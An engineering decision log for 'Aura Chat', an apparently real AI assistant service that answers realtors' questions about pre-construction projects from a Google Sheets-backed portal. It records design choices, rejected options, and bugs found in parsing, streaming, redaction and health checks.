| type | Townhome/Detached | Detached |
| occupancy | 2027/2028 | 2026 |
| focus | yes | no |

Nothing in the payload marks the pair as the same building, so both reached the
model as separate projects and either occupancy could be quoted as fact. A
realtor saw it as a location: "Whitby Meadows by Opus Home **in Ontario**".

The remaining 22 rows are aliases of projects listed elsewhere under their
proper names (`Duo` for DUO Condos, carrying a staler 2025 occupancy; `Brightside`,
`Castlemile`, `Wildflowers`) and four entries that are not projects at all
(`All Treasure Hills Projects`, `Mattamy All Projects`). About nine may be
genuinely unique, all of them without a city, a price, or in most cases a
builder. Sarath's call: let them go. If one turns out to be real, the fix is a
row on its own city tab, not keeping the roll-up alive.

**Rejected.** Doing it in `Ai.js`, server-side. Fewer rows over the wire, but it
costs a `clasp push` and an edit to the live deployment, and undoing it costs
another. In the adapter it is a one-line revert and the sheet keeps whatever use
the tab has for Sudhanshu.

**Also rejected:** de-duplicating by name instead of dropping the tab. It needs
a rule for which row wins when they conflict, and the sheet gives no basis for
one.

**Cost of undoing.** The 63 duplicates come back, and with them the ability to
quote either of two occupancy dates for the same project.

**Watch for.** `skipped_rollup_rows` is reported by `/doctor` on purpose. If it
ever reads 0 against the live sheet, the tab was renamed and the duplicates are
back in the index.

---

## 2026-08-24 — Docs audit: reconcile the guides with the code

**What.** Audited AGENTS.md and the six docs it points at against the tree.
Phase 2 had landed; most of the drift was from that one commit. Fixed the stale
facts, added `docs/aura-chat/operations.md`.

**The drift worth naming.** `roadmap.md` still called Phase 2 "next" and listed
`filters.py` as unwritten — a file that was deliberately never built, because
filtering became `domain/matching.py` (pure, so a SQL adapter reuses the
semantics) and the cache went inside the adapter. A roadmap that names a file
nobody intends to write is worse than one that says nothing: the next agent
creates it. It now records the supersession rather than the plan.

**Numbers that had drifted:** the `aiindex` window is `TTL_S = 300` (5 min), not
the "~10 min" three docs had inherited from the pre-build estimate; ruff reports
~16 findings, not ~10; the test count was 40 in one doc and 116 in another.
`/health` was still documented as returning a per-check breakdown, which it
stopped doing when the output was deliberately redacted.

**Why operations.md exists.** Two docs told the reader to send
`Authorization: Bearer <portal token>` and neither said where a token comes
from, so `/doctor` was undocumented in practice. It now carries the token
recipe, the full settings table, the Railway steps, and the `TOKEN_SECRET`
rotation runbook the architecture doc's risk table asked for and nobody wrote.

**One trap found by running the recipe rather than writing it.** `curl -X POST
-L` against the exec URL returns a Google HTML error page, not JSON: `-X` pins
the method across the 302, and the googleusercontent hop only answers GET. `-d`
alone is correct. The reason is written next to the command — it is otherwise
an afternoon of assuming the deployment is broken.

**Left open, deliberately:** `project_source` is declared in `config.py` and
read nowhere (`build()` constructs `ExecApiProjectRepo` unconditionally, though
its comment claims otherwise), and `project.py` groups `broker_url` under
`# links` while `CONFIDENTIAL_FIELDS` strips it. Both are decisions, not
typos.

---

## 2026-08-24 — A walkthrough of the whole system

**What.** [`how-it-works.md`](feature/aura-chat/how-it-works.md) — 1,049 lines, twelve
diagrams, ordered as a story: an empty process, then boot, then every file, then
one chat interaction traced end to end, then the other flows, the CLI, the
tests, and a troubleshooting map.

**Why it is separate from `architecture.md`.** That doc answers *why this shape*
— the options weighed, the ones rejected. This one answers *how it works*, for
someone who has already accepted the shape and needs to change something. Merging
them would make both worse: a person debugging a 401 at 11pm does not want to
read why Cloudflare Workers lost.

**What the second pass changed**, because the first draft was written partly from
memory and it showed:

- **The `/doctor` section was wrong.** Check order was off, and it omitted the
  redaction path for unverified callers. Worse, it missed the point: `portal_auth`
  and `token_verification` are a *pair*, and reading one against the other is what
  separates a mismatched `TOKEN_SECRET` from a stale session — the two failures
  that are indistinguishable from outside. That is now a diagram.
- **No method-level index**, which was half of what was asked for. A file list
  tells you nothing when you are hunting for where a thing happens.
- **The CLI was not traced at all**, including the login sequence — the one flow
  that touches a password.
- **Nothing on testing or on debugging.** Part VIII is a symptom → cause → file
  table with a decision tree, and is likely to get more use than any other part.

**The rule that emerged from doing it:** explain mechanisms, not structure. A
list of files is a directory listing. Why a queue and not a list, why filtering
runs before redaction, why `_to_project` is a boundary — those are the decisions
that look arbitrary in six months, and they are what a walkthrough is for.

---

## 2026-08-24 — `aura`, a terminal client with a dev mode

**What.** A CLI that signs in, asks questions, holds a conversation, and in
`--dev` shows every tool call, its arguments, timings and token usage. Plus the
service-side pieces it needed: `POST /login`, history on `/chat`, and `tool` /
`tool_result` events on the stream.

**Why over HTTP rather than in-process.** It hits the real endpoint with a real
token, so it exercises auth, SSE and the exact contract the PWA will consume. A
client that reached into the app directly would keep passing while the endpoint
was broken, which is the one thing a client is for.

**Why it signs in rather than taking a pasted token.** `aura login` prompts,
posts to `/login`, and stores only the token — at `0600`, never the password.
Copying a token out of browser storage by hand is the kind of step people skip,
and skipping it means the tool goes unused. The route passes the portal's own
wording through: *"too many attempts"* and *"invalid id or password"* mean
different things to whoever is trying to get in.

**History is text only, in our own shape.** `{role, content}`, deliberately not
PydanticAI's message type — the wire contract outlives whichever loop runs
underneath. Tool results are not replayed: a price the sheet has since changed
would go back into the prompt with no way for the model to know it was stale.
Client-supplied until Phase 4's server-side store replaces it.

### The streaming fix, which was not cosmetic

Tool events were collected into a list drained inside the text loop — and
`stream_text` yields nothing until the model has finished calling tools. So the
buffer could only flush *after* the work it described. Measured live: everything
landed together at 4300ms. Through an `asyncio.Queue` produced by a background
task, the tool event now arrives at 2252ms and the first text at 4300ms — two
seconds of "searching…" where there had been a blank spinner.

That restructure brought a second fix with it: the consumer now cancels the task
in a `finally`. **A realtor closing the app mid-answer previously left the run
going, and billing, with nobody reading it.**

### Two smaller ones worth remembering

- **A failed turn must not enter history.** `ask()` returns an empty answer on
  an error event, and the REPL was recording that as an assistant message with
  empty content. Some providers reject those outright, so one failure would
  poison every question after it. Both turns are dropped now — keeping the user
  turn alone would leave consecutive user messages, which fails the same way.
- **A subcommand is one bare word.** `aura login details for Great Gulf` used to
  match on the first word and open a password prompt. Being unexpectedly asked
  for a password is the least welcome thing a tool can do.

**`--help` needed writing, not generating.** `login` and `logout` are positional,
so argparse will not advertise them: the original help listed six flags and no
way to sign in at all. Four tests now assert the epilog covers signing in, the
interactive commands, every environment variable the code reads, and that the
service must be running — one of which caught me documenting `login` and
forgetting `logout`.

---

## 2026-08-24 — Phase 3: the agent, answering live

PydanticAI over OpenRouter, four tools bound to the redacting repo, `POST /chat`
streaming SSE. Verified against real Aura data with a real realtor token.

**Cards come from tool results, never from the prose.** If the model says "around
$1.2M" about an $899,900 project, the card still says $899,900. Restating numbers
is how they drift between the sheet and the buyer.

**The runtime is handed a repo, it does not hold one.** The client sends `mode`,
but nothing downstream trusts it beyond choosing a `Viewer`; the redacting repo
is built in the endpoint, so the agent cannot widen its own access. Confirmed:
in Client Mode `"4%"` never appears anywhere in the model transcript.

**What the prompt carries vs what the code carries.** The prompt holds rules the
model is *asked* to follow — tone, tool choice, what to say when it cannot
answer. Redaction, read-only and the result cap are not in it, because a prompt
instruction is a request and this agent answers questions about other people's
money.

### Two bugs that only live testing could find

1. **`max_tokens` defaulted to 65535.** Providers advertise their whole context,
   and OpenRouter reserves credit against that number *before* the call — so
   every request was refused 402 for lack of credit to cover an answer nobody
   wanted. Capped at 1500, which is generous for a reply the prompt asks to keep
   to two or three sentences.
2. **`get_project` accepted only ids.** A realtor naming a project hands over a
   *name*; the model passed the name, got nothing, and told them their own
   project did not exist. "What's the deposit for X?" is among the commonest
   questions there is.

The second fix is the more interesting one. Resolving names in the tool was not
enough: told to search when a lookup missed, the model often did not. So the tool
now does the search itself and returns the candidates — two Brampton projects
really are both called "Mayfield Village", and the realtor needs to be asked
which, not told neither exists.

**That is the same lesson as the redaction work.** Instructing a model is a
request; handing it the data is a guarantee. Anything that must hold belongs in
code, and "must hold" includes not denying that a brokerage's own inventory
exists.

**Known gap.** "I could not find any detached homes under $1M" does not
distinguish *no matches* from *no prices recorded anywhere*, and a realtor could
reasonably read it as the former. Mostly self-resolving once the commercial
columns are filled, but the tool could say which it is.

---

## 2026-08-24 — Redaction became a property of the repo, not a step

**What.** `Viewer` (role × mode), `Project.for_viewer()`, and a
`RedactingProjectRepo` decorator built per request. `tools.py` lost its
`_present()` helper entirely.

**Why, given `_present()` already worked.** It was **opt-in**. Every tool had to
remember to call it, and a tool that forgot would leak silently — no error, no
log, no undo, just commission on a screen a buyer is looking at. That rule holds
right until someone adds a sixth tool at 11pm on Tuesday.

Tools are now handed a repo that cannot return an unredacted `Project`. The
guarantee is structural rather than procedural, which is what AUR-18 and AUR-55
actually ask for: stripped **in code before the model is called**, never by
asking the model to withhold something.

**Two axes, not one.** Role is what the *account* may ever see; mode is what is
on the screen *right now*. They are unioned, never intersected — an admin in
Client Mode is still showing a buyer a screen, so entitlement never buys back a
client-hidden field. Collapsing them into a single flag would get one of the
four combinations wrong.

**The subtlety that shaped the decorator.** Search filters the **unredacted**
records and redacts the results. A query may legitimately *use* a field it may
not *show*; redacting first would silently change which projects come back
depending on who is looking — a far worse bug than showing too little.

**Enforcement, not memory.** `test_layering.py` now fails if `tools.py` mentions
`for_viewer`, and if anything above the container reaches `container.projects`
directly instead of `projects_for(viewer)`. `test_redaction.py` is exhaustive
over all four (role, mode) pairs and asserts both directions: nothing hidden
leaks, and nothing beyond the policy is removed — over-redaction quietly hands a
realtor a worse tool.

**`status` joined the client-hidden set.** "Focus" is an internal sales signal,
not something to show a buyer.

**Also:** `/doctor`'s project probe now goes through the wrapper at the strictest
setting. A check that takes a shortcut past the layer it is meant to prove has
stopped being a check.

---

## 2026-08-24 — Four parsing and freshness bugs, from review

All four produced **wrong answers rather than errors**, which is the failure mode
this project can least afford, and none had a test.

1. **`recent()` measured its window from the newest row, not from today.** A sheet
   untouched for six weeks would still report its newest projects as "what changed
   this week" — freshness the sheet never claimed — and an empty result was
   impossible, so "nothing changed recently" could never be answered.
2. **A price range in a single column lost its high end.** The `parse_price_range`
   fallback was guarded by `if low is None`, but `parse_money`'s regex is
   unanchored and happily returns the first number in `"$800,000 - $1,400,000"`.
   The guard could never fire. A project selling up to $1.4M was excluded from an
   "at least $1M" search. The price cell is now read as a range in every case.
3. **`parse_percent` turned `"1%"` into 100%.** The correction for percent-formatted
   cells displaying as fractions fired on any value ≤ 1 without noticing that a
   percent sign had already said what the value was. A 1% deposit became a 100%
   one: excluded from every "max 10% deposit" search, and if shown, telling a
   realtor the buyer pays the whole price up front.
4. **`TBD` was counted as a parser failure.** `parse_money` returns None for
   placeholders by design, so 40 projects correctly marked "TBD" would have
   reported as 40 unreadable prices and pushed `/doctor` to degraded — burying the
   one signal that check exists to give.

**The shape shared by 1, 2 and 4:** each is a value that is *absent or unknown*
being treated as a value that is *known*. `is_blank` is now public precisely so
callers can tell "nobody filled this in" apart from "the parser could not read
this" — they both produce None and mean opposite things about the data's health.

**Worth noting:** the existing 120 tests passed against all four. Coverage of the
happy path says nothing about whether the edges are right.

---

## 2026-08-24 — Phase 2 verified against live data

`/doctor` green end to end with a real realtor token: 246 projects read from the
live sheets in ~2s, `token_verification` and `portal_auth` both passing.

**Two things this shook out:**

1. **A refresh needs its own timeout.** `refresh()` busts both caches, which makes
   the portal walk all ~38 city tabs — about a minute. The ordinary 30s read
   budget cut it off mid-rebuild and surfaced as a bare "portal unreachable".
   `PortalClient.call` now takes a per-call override and the refresh path uses
   240s.
2. **`data_quality` counts rejected values, not missing ones.** "246 projects" with
   no unparsed count reads like success; in fact every price cell was empty. The
   check is honest about what it measures, but the number needs reading carefully:
   it answers "did anything fail to parse", not "is there anything there".

**State of the data as of this run:** `PROJECT ID` is populated for all 23
BRAMPTON projects and addresses are in, so the whole sheet-to-domain chain is
proven. `STARTING PRICE`, `BEDROOMS`, `DEPOSIT %`, `INCENTIVES` and
`LAST UPDATED` are present as headers with empty cells. Nothing to parse yet, so
the price format stays an open question until Sudhanshu writes the first few
values — deliberately not agreed in the abstract, because a format settled
before contact with real data tends not to survive it.

**Also confirmed:** deploying is domain-restricted. `clasp push` works from any
account with edit access; publishing needs an account in the script owner's
domain (`office@aurakeyrealty.ca`). The deployment went `@22 → @25` on the same
id, so the URL every installed phone calls is unchanged.

---

## 2026-08-24 — Aura Chat Phase 2: tools over live data

**What.** `Ai.js` and one `aiindex` action in the portal; `ProjectRepo` over it;
price/deposit/date parsers; the filter rules; four tools. 116 tests.

**Why one big payload instead of a filtered query.** The service caches the whole
index for five minutes and filters in Python, so a busy conversation costs one
portal fetch per window rather than one per question. Apps Script runtime is a
single daily budget shared with the realtors' own app; protecting it is why Aura
Chat runs outside Apps Script at all.

**Why a separate cache key.** `index_api` backs the portal's Cities and Focus
screens and sits on the Home hot path. Both indexes are built from the same
per-city `proj_<CITY>` entries, so the sheet reads are shared even though the
payloads are not.

**Decisions taken here:**

- **Extended `FIELD_KEYS` rather than reading the tabs twice.** `getProjects_`
  now emits the commercial columns too. Additive: an unmapped column reads as
  empty, so the 37 tabs without them behave exactly as before.
- **Slug ids as scaffolding.** A project with no `PROJECT ID` gets
  `city:project-name`, so deep links and comparison work while Sudhanshu fills
  the column. **Renaming a project changes its id** and any link minted
  beforehand stops resolving — the accepted cost of shipping before the data.
  A real id always wins.
- **Unavailable projects travel, and are filtered in Python.** The portal's own
  index drops them because its screens list what is for sale. Aura still has to
  answer "what happened to X?", so `search` hides them and `get` finds them.
- **The cache is in-process, in the adapter.** Not in `tools.py` (a Postgres
  adapter would not want it) and not in Postgres (phase 4). Known limit: on more
  than one worker each keeps its own copy, so the portal sees one fetch per
  worker per window. At this team's size we do not scale out.

**Two traps now guarded in code:**

- `FIELD_KEYS` binds each field to the **first** header containing its keyword,
  so `PRICE` would have matched ONTARIO's `PRICE RANGE`. The keyword is the whole
  `STARTING PRICE`. Comment sits on the table.
- A refused `aiindex` **raises** rather than caching an empty list. Caching a
  refusal would serve "no projects found" for five minutes, which a realtor
  cannot tell apart from an empty sheet.

**The rule the parsers follow: never guess.** `parse_money("1.2")` returns None
rather than choosing between $1.20 and $1.2M, and an unpriced project never
satisfies a price filter — it is *unknown*, not cheap. Letting it through is
precisely how an answer ends up asserting something the sheet never said. Two
corrections are deliberate exceptions, both documented at the call site: a range
yields its low end, and a deposit of `0.1` is read as 10% (a percent-formatted
cell displaying as a fraction).

Unparseable prices are **counted**, not logged: a spike means Sudhanshu has
started writing them a new way, and `/doctor` should say so before a realtor
finds out by getting a wrong answer.

**Not verified end to end.** `aiindex` is wired (`dev/verify.mjs` resolves the
dispatch target) and gated, but reading real rows needs a realtor token, which
this session did not have. First run with a real token is the outstanding check.

---

## 2026-08-24 — `dev/verify.mjs` learned extension globs; `Audit.js` is a server file

**What.** Two fixes to the stray-root-file check: `Audit.js` added to
`SERVER_FILES`, and the `.claspignore` matcher now honours `*.ext` globs.

**Why.** A code review flagged `AGENTS.md` and `CLAUDE.md` in `.claspignore` as
dead — `.clasp.json` only pushes `.js`/`.gs`/`.html`/`.json`, so Markdown is never
a push candidate. **That reasoning was right about clasp and wrong about the
repo.** Those lines were load-bearing for `dev/verify.mjs`, whose matcher
understood only exact names and directory prefixes. Removing them failed
verification for a reason invisible from the line itself.

Teaching the matcher globs was the better fix than restoring two lines: every
future doc is now covered without a new entry, and the check keeps doing its real
job — failing the day an unignored *code* path appears in the root.

`Audit.js` was simply missing from the list: it is a genuine server file, pushed
deliberately, and already documented as one in `AGENTS.md` §2.

**Worth remembering:** "this line looks redundant" is not the same as "this line
does nothing". Before deleting one, run the check that might be leaning on it.

---

## 2026-08-24 — `/health` split into a probe and a doctor

**What.** `GET /health` is now a terse public liveness probe. The real
diagnostics moved to `GET /doctor`, which requires a token and runs live checks:
`config`, `portal_reachable`, `portal_auth`, `token_verification`,
`project_data`, `conversation_store`, `document_index`.

**Why.** The original `/health` reported `app: true` (meaningless — it answered,
so it is up) and `auth_configured` (proves a setting is *present*, not
*correct*). Neither tells a realtor why an answer failed. It also could not check
the data path at all: every portal action except `login`/`session` needs a token,
and a public endpoint has none.

**Three things worth keeping:**

1. **`/doctor` accepts a token that does not verify.** Found while testing: with
   a wrong `TOKEN_SECRET` nothing verifies, so `/doctor` returned 401 — unreachable
   at exactly the moment it is needed. A doctor that stops working when the
   patient is sick is no use. It now diagnoses the refusal instead of refusing.
2. **It separates two failures that look identical.** A mismatched `TOKEN_SECRET`
   and an expired session both show as "every realtor gets 401 while /health is
   green". Cross-referencing local verification against the portal's own verdict
   distinguishes them, and says so in words.
3. **`/health` deliberately withholds what `/doctor` states.** A public endpoint
   naming which secret is unset tells a stranger when forging might work. An
   unverified caller to `/doctor` gets detail on `token_verification` and
   `portal_auth` only; the rest is redacted.

Severity is graded: no conversation store → `degraded` (history breaks, chat
works); no project data → `down`. So a platform restart policy fires on a real
outage, not on Postgres hiccuping.

---

## 2026-08-24 — Aura Chat Phase 1: service skeleton, ports and auth

**What.** `aura-chat/` — Python 3.12, FastAPI, ports-and-adapters. Domain models,
five Protocols, the portal HTTP client, an HMAC token verifier, a composition
root, and 40 tests.

**Why a separate service at all.** Apps Script cannot stream (`ContentService`
buffers), caps a fetch at ~60s, and — the deciding factor — shares a **single
daily runtime budget with the portal itself**. Chat traffic could take Home down.
It also blocks every Future ticket: document RAG, webhooks, push.

**Why it still reuses the portal.** The service calls the existing exec API as
its data plane, so `Sheets.js` readers, the cache layer and the permission model
are not re-implemented, and the Google Sheets API quota is never touched.

**Why the caller's own token is the credential.** The service forwards the
realtor's token unchanged. No service account, no standing privilege: whatever
the portal will not show that realtor, it will not show Aura Chat. A revoked
realtor loses chat in the same window they lose the portal.

**Auth needed two levels.** Python can check the HMAC signature and the 7-day
window, but *not* `credGen` or whether the account still exists — both need the
LOGIN sheet. So `verify_local()` is offline (rejects junk with no round trip) and
`verify()` delegates liveness to the portal's `session` action, cached 60s. If the
portal is *unwell* rather than refusing, a locally valid token is honoured —
otherwise an Apps Script outage signs out the whole team.

**Sharp edges recorded in code:**

- Token fields are parsed **from the end**. A username may contain `|`, so
  counting from the front misreads every other field. Same bug as `61b06fc`; now
  a test.
- `TOKEN_SECRET` must be byte-identical to the Script Property. A mismatch shows
  as a universal 401 with a green `/health` — hence `/doctor`.
- Lifespan only builds a container if none was injected. Building over an
  injected one silently replaced test fakes with real adapters reading a
  nonexistent `.env`.

**Rejected:** all-in Apps Script (no streaming, shared quota); Cloudflare Workers
(genuinely good and cheaper — lost on familiarity during a 2-day sprint; Hono and
FastAPI both port if we revisit); a Next.js rebuild (the PWA already delivers
phone + web + install + offline + auth); Vertex AI Agent Builder and Azure AI
Foundry (metered, high lock-in, and their auth models fight ours — realtors have
no Google or Microsoft identity); LangChain (300+ integrations and graph
orchestration for an agent with five tools and one loop).

---

## 2026-08-24 — Ports and adapters, so the data source can move

**What.** Five seams behind `Protocol`s: `ProjectRepo`, `ConversationStore`,
`DocumentIndex`, `AuthVerifier`, `AgentRuntime`.

**Why.** Two swaps are likely rather than hypothetical: project data is expected
to outgrow Sheets, and the agent framework is a fresh bet.

**What makes the data-source swap real** — not the Protocol, but two disciplines:

1. A source-agnostic `Project` domain model. Sheet headers, row numbers and
   `$899,900` parsing live **only** inside the adapter's `_map()`. The moment a
   column name leaks into `tools.py`, the swap stops being one file.
2. Ports expressed as **query intent**: `search(ProjectFilters) -> list[Project]`,
   never `read_tab()`. A tool that fetches everything and filters it itself works
   fine today — the sheet returns everything anyway — and silently blocks the move
   to SQL, where the same filter should become a `WHERE` clause.

`tests/test_layering.py` AST-walks imports and enforces all of it: `domain/`
imports nothing external, `ports/` declares only Protocols, and **only**
`container.py` constructs an adapter.

**Deliberately not ports:** the HTTP framework, the Postgres driver, and the model
provider — swapping OpenRouter for Gemini is already a model string inside the
runtime. A seam that will never gain a second adapter is cost with no return.
Hard cap: five ports, one adapter each during the sprint.

---

## 2026-08-24 — Discovery: what the portal actually holds

Full write-up: `investigation-aur-3-4-5.md`, removed 2026-10-06 (in git history).

**The two findings that reshaped the sprint:**

1. **The city tabs carry no commercial data.** 38 tabs, 36 sharing one layout:
   project, builder, type, occupancy, status, three link columns. No price,
   deposit, bedrooms, incentives or address. The flagship demo query — *"show
   detached under $1M"* — could not be answered at all. This was not a
   data-quality gap to be cleaned; the columns had to be **created**. Sudhanshu
   began adding them to BRAMPTON on 2026-08-24.
2. **There is no project page and no project ID.** The deepest route was
   `#city/BRAMPTON`; projects render as cards whose links go *out* to builder
   portals. A project was addressable only as (tab, row number, name) — and the
   row number moves. That blocks `getProject`, `compareProjects`, deep links, and
   the Day 1 gate.

**The good news:** `buildSearchIndex_` already builds a warm, cached, cross-city
project array — and has **no action in the dispatcher**. It exists only to feed
`getFocus_` and `getCityCounts_`. Exposing and filtering it is most of the search
tool, not a build from scratch.

**Why filtering will happen in Python, not Apps Script:** one new read-only
`aiindex` action returns that array; the service caches it on a short TTL and
filters locally. Richer filters, no duplicated logic, and roughly one portal
fetch per TTL window instead of one per question — which is also the main
mitigation for the shared-runtime risk.

**A column rule worth not rediscovering.** New columns go on the **right**, never
at A. `getCities_` identifies a city tab by column A containing `PROJECT` and B
containing `BUILDER`; inserting at A makes B `PROJECT`, the tab stops being
recognised, and it vanishes from the Cities screen. Separately, `buildColMap_`
binds each field to the **first** header containing its keyword, so a `PROJECT ID`
column to the left of `PROJECT` would make every project name render as an ID.
Positions may differ per tab — matching is by header text, so appending is safe.

**Also confirmed:** the pricing tabs nothing in the app reads (`HotPriceSheet`,
`PRECON`, `HotDeals`, `Deposit Calculator`, `RESALE`) are **not** a usable source.
`HotPriceSheet` has prices but no project column at all; the others are 12–32 rows
keyed on free text.

---

## 2026-08-24 — `Audit.js`

Editor-only, read-only schema diagnostics: `auditCityHeaders()`,
`auditPriceTabs()`, `auditTabRows(tab)`. Nothing routed, nothing written.

**Why it exists.** The sheets are private and no available credential could read
them from outside — `clasp`'s OAuth scopes cover Apps Script and Drive *metadata*,
not sheet contents. Running the question inside the script was the way in.

Safe to delete once the sprint's discovery tickets close.
